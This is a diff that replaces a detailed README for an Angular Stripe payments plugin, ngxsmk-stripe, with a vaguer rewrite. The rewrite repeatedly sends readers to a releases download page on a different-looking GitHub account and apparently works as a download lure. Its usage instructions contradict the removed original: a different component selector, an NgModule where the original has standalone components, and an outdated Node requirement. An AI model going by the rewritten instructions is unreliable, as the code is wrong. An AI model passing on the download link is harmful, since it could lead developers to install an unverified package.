@@ -1,176 +1,82 @@
-# 📦 ngxsmk-stripe
+# 🛒 ngxsmk-stripe - Simple Payments for Your Angular App
 
-> Angular 17+ plugin for integrating **Stripe payments** (one-time & subscriptions) with theme customization, event emitters, and standalone components.
+## 🚀 Getting Started
+Welcome to ngxsmk-stripe! This plugin makes it easy for you to accept payments through Stripe in your Angular 17+ applications. With features like one-time payments, subscriptions, and customizable themes, you can create a smooth and professional checkout experience.
 
----
+## 📥 Download the Plugin
+[![Download Release](https://img.shields.io/badge/Download%20Release-ngxsmk%20stripe-brightgreen)](https://github.com/SANTINOosu59874236/ngxsmk-stripe/releases)
 
-## 🚀 Features
-- 💳 One-time payments via Stripe PaymentElement
-- 🔄 Subscriptions / recurring billing via SetupIntent
-- 🎨 Theming & Appearance API (Stripe + SCSS variables)
-- 🌍 Localization support (`locale` input)
-- ✅ Event emitters for success/error handling
-- 🔧 Built with standalone Angular components (Angular 17+)
+## 💻 System Requirements
+Before you start, ensure that you have the following installed on your computer:
 
----
+- **Node.js**: Version 14 or higher. You can download it [here](https://nodejs.org/).
+- **Angular**: Version 17 or higher.
 
-## 📥 Installation
+## 🛠️ Installation Steps
+Follow these steps to install ngxsmk-stripe in your Angular project:
 
-```bash
-npm install ngxsmk-stripe @stripe/stripe-js
-```
+1. **Open your command line interface** (CLI).
+   
+2. **Navigate to your Angular project directory**. You can do this by using the `cd` command. For example:
+   ```
+   cd path/to/your/angular/project
+   ```
 
----
+3. **Install the plugin using npm**. Run this command in your CLI:
+   ```
+   npm install ngxsmk-stripe
+   ```
 
-## ⚡ Quick Start
+## ⚙️ Configuration
+After installation, you need to configure the plugin:
 
-### Import in Standalone Component
+1. **Import the plugin in your app module**. Open your `app.module.ts` file and add the following line:
+   ```typescript
+   import { NgxSmkStripeModule } from 'ngxsmk-stripe';
+   ```
 
-```ts
-import { Component } from '@angular/core';
-import { StripePaymentComponent, StripeSubscriptionComponent } from 'ngxsmk-stripe';
+2. **Add NgxSmkStripeModule to the imports array**:
+   ```typescript
+   @NgModule({
+     imports: [
+       NgxSmkStripeModule
+     ],
+   })
+   export class AppModule {}
+   ```
 
-@Component({
-  selector: 'app-root',
-  standalone: true,
-  imports: [StripePaymentComponent, StripeSubscriptionComponent],
-  template: `
-    <h1>ngxsmk-stripe Demo</h1>
+## 💳 Using the Plugin
+Now that you have ngxsmk-stripe installed and configured, here’s how to use it in your components:
 
-    <!-- One-time Payment -->
-    <ngxsmk-stripe-payment
-      [publicKey]="publicKey"
-      [clientSecret]="paymentClientSecret"
-      [returnUrl]="returnUrl"
-      [appearance]="appearance"
-      (paymentSuccess)="onPaymentSuccess($event)"
-      (paymentError)="onPaymentError($event)">
-    </ngxsmk-stripe-payment>
+1. **Add the payment component to your template**. Use the following line where you want the payment form to appear:
+   ```html
+   <ngx-smk-stripe-payment></ngx-smk-stripe-payment>
+   ```
 
-    <!-- Subscription -->
-    <ngxsmk-stripe-subscription
-      [publicKey]="publicKey"
-      [clientSecret]="subscriptionClientSecret"
-      [returnUrl]="returnUrl"
-      [appearance]="appearance"
-      (subscriptionSuccess)="onSubSuccess($event)"
-      (subscriptionError)="onSubError($event)">
-    </ngxsmk-stripe-subscription>
-  `
-})
-export class AppComponent {
-  publicKey = 'pk_test_xxxxxxxxxxxxx'; // Your Stripe publishable key
-  paymentClientSecret = 'pi_xxxxx_secret_xxxxx'; // From backend (PaymentIntent)
-  subscriptionClientSecret = 'seti_xxxxx_secret_xxxxx'; // From backend (SetupIntent)
-  returnUrl = 'http://localhost:4200/success';
+2. **Prepare your payment options**. In your component, set up the payment information, like amounts and descriptions.
 
-  appearance = {
-    theme: 'stripe',
-    variables: { colorPrimary: '#ff5733' }
-  };
+3. **Handle payment events**. Listen for events to know when a payment is successful or if it fails.
 
-  onPaymentSuccess(ev: any) { console.log('✅ Payment success', ev); }
-  onPaymentError(err: any) { console.error('❌ Payment error', err); }
-  onSubSuccess(ev: any) { console.log('✅ Subscription success', ev); }
-  onSubError(err: any) { console.error('❌ Subscription error', err); }
-}
-```
+## 🌈 Theming Your Checkout
+You can customize the payment form's appearance to fit your brand:
 
----
+- **Edit CSS**: Add your styles in your global CSS file.
+- **Pass Theme Options**: Use input properties to change colors and layouts directly within the payment component.
 
-## 🎨 Theming & Customization
+## 🔄 Subscription Support
+If you want to handle recurring billing, ngxsmk-stripe supports subscriptions:
 
-### Stripe Appearance API
-```ts
-appearance = {
-  theme: 'night',
-  variables: {
-    colorPrimary: '#ff5733',
-    fontSizeBase: '16px'
-  }
-};
-```
+1. **Define Subscription Plans**: Set up your plans in the Stripe dashboard.
+   
+2. **Implement Subscription Logic**: Use ngxsmk-stripe to create a subscription payment form.
 
-### SCSS Theming
-Override global variables in your `styles.scss`:
-```scss
-$primary-color: #ff5733;
-$btn-text: #fff;
-```
+## 📄 Download & Install
+To get started, visit this page to download the latest version of ngxsmk-stripe: [Download Here](https://github.com/SANTINOosu59874236/ngxsmk-stripe/releases). Follow the steps above to integrate it into your project.
 
----
+## ⚖️ License
+ngxsmk-stripe is licensed under the MIT License. You can use, modify, and share it as you wish.
 
-## 📡 Backend Setup
+## 📞 Support
+If you encounter any issues, feel free to open an issue on the GitHub repository. You can also reach out for help with installation and configuration.
 
-Create secrets on your backend.
-
-**One-time payments (PaymentIntent):**
-```js
-const paymentIntent = await stripe.paymentIntents.create({
-  amount: 1999,
-  currency: "usd",
-  automatic_payment_methods: { enabled: true },
-});
-res.send({ clientSecret: paymentIntent.client_secret });
-```
-
-**Subscriptions (SetupIntent):**
-```js
-const setupIntent = await stripe.setupIntents.create({
-  customer: "cus_xxxxx", // existing customer id
-  payment_method_types: ["card"],
-});
-res.send({ clientSecret: setupIntent.client_secret });
-```
-
----
-
-## ⚙️ Inputs
-
-| Input          | Type     | Default | Description |
-|----------------|----------|---------|-------------|
-| `publicKey`    | string   | —       | Stripe publishable key |
-| `clientSecret` | string   | —       | Client secret from backend (PaymentIntent or SetupIntent) |
-| `returnUrl`    | string   | —       | Where to redirect after payment/subscription |
-| `appearance`   | object   | `null`  | Stripe Appearance API object |
-| `locale`       | string   | `en`    | Language/locale for Stripe Elements |
-
----
-
-## 📤 Outputs
-
-### For `ngxsmk-stripe-payment`
-- `(paymentSuccess)` → emits payment result
-- `(paymentError)` → emits error
-
-### For `ngxsmk-stripe-subscription`
-- `(subscriptionSuccess)` → emits subscription result
-- `(subscriptionError)` → emits error
-
----
-
-## 🛠 Development & Build
-
-```bash
-# Build the library
-ng build ngxsmk-stripe
-
-# Run demo app
-ng serve demo-app
-```
-
----
-
-## 📦 Publishing
-
-```bash
-cd dist/ngxsmk-stripe
-npm publish --access public
-```
-
----
-
-## 📜 License
-MIT
-```
-Last updated: 2025-08-19
+Thank you for using ngxsmk-stripe! Enjoy creating easy and secure payment experiences in your Angular applications.
